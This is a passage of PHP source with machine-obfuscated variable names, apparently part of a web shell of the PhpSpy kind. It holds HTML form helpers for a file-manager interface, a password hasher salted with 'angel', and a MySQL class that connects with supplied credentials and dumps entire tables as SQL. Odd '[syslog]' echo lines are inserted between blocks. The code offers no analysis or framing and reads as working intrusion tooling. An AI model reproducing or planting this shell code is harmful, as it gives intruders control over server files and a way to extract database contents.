($spa3abbf['name'] = 'form1'); $spa3abbf['extra'] = isset($spa3abbf['extra']) ? $spa3abbf['extra'] : ''; $spa3abbf['onsubmit'] = isset($spa3abbf['onsubmit']) ? "onsubmit=\"{$spa3abbf['onsubmit']}\"" : ''; p("<form name=\"{$spa3abbf['name']}\" id=\"{$spa3abbf['name']}\" action=\"" . SELF . "\" method=\"{$spa3abbf['method']}\" {$spa3abbf['onsubmit']} {$spa3abbf['extra']}>"); if (isset($spa3abbf['title'])) { p('<h2>' . $spa3abbf['title'] . ' &raquo;</h2>'); } } function maketext($spa3abbf = array()) { $spa3abbf['title'] = isset($spa3abbf['title']) ? $spa3abbf['title'] . '<br />' : ''; $spa3abbf['name'] = isset($spa3abbf['name']) ? $spa3abbf['name'] : ''; p("<p>{$spa3abbf['title']}<textarea class=\"area\" id=\"{$spa3abbf['name']}\" name=\"{$spa3abbf['name']}\" cols=\"100\" rows=\"25\">{$spa3abbf['value']}</textarea></p>"); } function formfooter($spd86858 = '') { !$spd86858 && ($spd86858 = 'submit'); p('<p><input class="bt" name="' . $spd86858 . '" id="' . $spd86858 . '" type="submit" value="Submit"></p>'); p('</form>'); } function goback() { global $sp570d5b, $sp093c94; p('<form action="' . SELF . '" method="post"><input type="hidden" name="act" value="file" /><input type="hidden" name="cwd" value="' . $sp570d5b . '" /><input type="hidden" name="charset" value="' . $sp093c94 . '" /><p><input class="bt" type="submit" value="Go back..."></p></form>'); } function formfoot() { p('</form>'); } function encode_pass($sp7ceca3) { $sp8db113 = 'angel'; $sp7ceca3 = md5($sp8db113 . $sp7ceca3); $sp7ceca3 = md5($sp7ceca3 . $sp8db113); $sp7ceca3 = md5($sp8db113 . $sp7ceca3 . $sp8db113); return $sp7ceca3; } function pr($spd09f64) { p('<div style="text-align: left;border:1px solid #ddd;"><pre>' . print_r($spd09f64) . '</pre></div>'); } echo '[syslog]08
'; class DB_MySQL { var $querycount = 0; var $link; var $charsetdb = array(); var $charset = ''; function connect($sp342aef, $spe1f996, $spc9e959, $sp50c961 = '') { @ini_set('mysql.connect_timeout', 5); if (!($this->link = @mysql_connect($sp342aef, $spe1f996, $spc9e959, 1))) { $this->halt('Can not connect to MySQL server'); } if ($this->version() > '4.1') { $this->setcharset($this->charset); } $sp50c961 && mysql_select_db($sp50c961, $this->link); } function setcharset($sp093c94) { if ($sp093c94 && $this->charsetdb[$sp093c94]) { if (function_exists('mysql_set_charset')) { mysql_set_charset($this->charsetdb[$sp093c94], $this->link); } else { $this->query('SET character_set_connection=\'' . $this->charsetdb[$sp093c94] . '\', character_set_results=\'' . $this->charsetdb[$sp093c94] . '\', character_set_client=binary'); } } } function select_db($sp50c961) { return mysql_select_db($sp50c961, $this->link); } function geterrdesc() { return $this->link ? mysql_error($this->link) : mysql_error(); } function geterrno() { return intval($this->link ? mysql_errno($this->link) : mysql_errno()); } function fetch($sp8cac4d, $sp5a53d8 = MYSQL_ASSOC) { return mysql_fetch_array($sp8cac4d, $sp5a53d8); } function query($sp2f57d0) { if (!($sp8cac4d = mysql_query($sp2f57d0, $this->link))) { $this->halt('MySQL Query Error', $sp2f57d0); } $this->querycount++; return $sp8cac4d; } function query_res($sp2f57d0) { $sp8e5eb2 = ''; if (!($sp8e5eb2 = mysql_query($sp2f57d0, $this->link))) { $sp8e5eb2 = 0; } else { if (is_resource($sp8e5eb2)) { $sp8e5eb2 = 1; } else { $sp8e5eb2 = 2; } } $this->querycount++; return $sp8e5eb2; } function num_rows($sp8cac4d) { $sp8cac4d = mysql_num_rows($sp8cac4d); return $sp8cac4d; } function num_fields($sp8cac4d) { $sp8cac4d = mysql_num_fields($sp8cac4d); return $sp8cac4d; } function affected_rows() { return mysql_affected_rows($this->link); } function result($sp8cac4d, $spa596f1) { $sp8cac4d = mysql_result($sp8cac4d, $spa596f1); return $sp8cac4d; } function free_result($sp8cac4d) { $sp8cac4d = mysql_free_result($sp8cac4d); return $sp8cac4d; } function version() { return mysql_get_server_info($this->link); } function close() { return mysql_close($this->link); } function halt($spcb2190 = '') { echo '<h2>' . htmlspecialchars($spcb2190) . '</h2>
'; echo '<p class="b">Mysql error description: ' . htmlspecialchars($this->geterrdesc()) . '</p>
'; echo '<p class="b">Mysql error number: ' . $this->geterrno() . '</p>
'; die; } function get_fields_meta($spb7d120) { $spdf819b = array(); $spa9e775 = $this->num_fields($spb7d120); for ($sp412bbc = 0; $sp412bbc < $spa9e775; $sp412bbc++) { $sp93fb34 = mysql_fetch_field($spb7d120, $sp412bbc); $spdf819b[] = $sp93fb34; } return $spdf819b; } function sqlAddSlashes($sp1acd5c = '') { $sp1acd5c = str_replace('\\', '\\\\', $sp1acd5c); $sp1acd5c = str_replace('\'', '\'\'', $sp1acd5c); return $sp1acd5c; } function sqldump($sp110772, $spe0ea16 = 0) { $spf646a0 = IS_WIN ? '
' : '
'; $sp841bb3 = array(' ', '
', '', ''); $spa5b2b0 = array('\\0', '\\n', '\\r', '\\Z'); if (isset($this->charset) && isset($this->charsetdb[$this->charset])) { $spfea3c4 = $this->charsetdb[$this->charset]; } else { $spfea3c4 = $this->charsetdb['utf-8']; } $sp9a1ce3 = 'SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";' . $spf646a0 . $spf646a0; $sp9a1ce3 .= '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;' . $spf646a0 . '/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;' . $spf646a0 . '/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;' . $spf646a0 . '/*!40101 SET NAMES ' . $spfea3c4 . ' */;' . $spf646a0 . $spf646a0; $sp9a1ce3 .= "DROP TABLE IF EXISTS `{$sp110772}`;" . $spf646a0; $sp8e5eb2 = $this->query("SHOW CREATE TABLE {$sp110772}"); $spe8e7e2 = $this->fetch($sp8e5eb2, MYSQL_NUM); $sp9a1ce3 .= $spe8e7e2[1] . ';' . $spf646a0 . $spf646a0; if (strpos($sp9a1ce3, '(
 ')) { $sp9a1ce3 = str_replace('
', $spf646a0, $sp9a1ce3); } elseif (strpos($sp9a1ce3, '(
 ')) { $sp9a1ce3 = str_replace('
', $spf646a0, $sp9a1ce3); } elseif (strpos($sp9a1ce3, '( ')) { $sp9a1ce3 = str_replace('', $spf646a0, $sp9a1ce3); } unset($spe8e7e2); if ($spe0ea16) { fwrite($spe0ea16, $sp9a1ce3); } else { echo $sp9a1ce3; } $sp9a1ce3 = ''; $sp5183f2 = $this->query("SELECT * FROM {$sp110772}"); $sp080ee5 = $this->num_fields($sp5183f2); $spa73d59 = $this->get_fields_meta($sp5183f2); while ($spa596f1 = $this->fetch($sp5183f2, MYSQL_NUM)) { for ($sp460372 = 0; $sp460372 < $sp080ee5; $sp460372++) { if (!isset($spa596f1[$sp460372]) || is_null($spa596f1[$sp460372])) { $spe2475f[] = 'NULL'; } elseif ($spa73d59[$sp460372]->numeric && $spa73d59[$sp460372]->type != 'timestamp' && !$spa73d59[$sp460372]->blob) { $spe2475f[] = $spa596f1[$sp460372]; } elseif ($spa73d59[$sp460372]->blob) { if (empty($spa596f1[$sp460372]) && $spa596f1[$sp460372] != '0') { $spe2475f[] = '\'\''; } else { $spe2475f[] = '0x' . bin2hex($spa596f1[$sp460372]); } } else { $spe2475f[] = '\'' . str_replace($sp841bb3, $spa5b2b0, $this->sqlAddSlashes($spa596f1[$sp460372])) . '\''; } } $sp9a1ce3 = 'INSERT INTO `' . $sp110772 . '` VALUES(' . implode(', ', $spe2475f) . ');' . $spf646a0; unset($spe2475f); if ($spe0ea16) { fwrite($spe0ea16, $sp9a1ce3); } else { echo $sp9a1ce3; } } $this->free_result($sp5183f2); } } echo '[syslog]09
';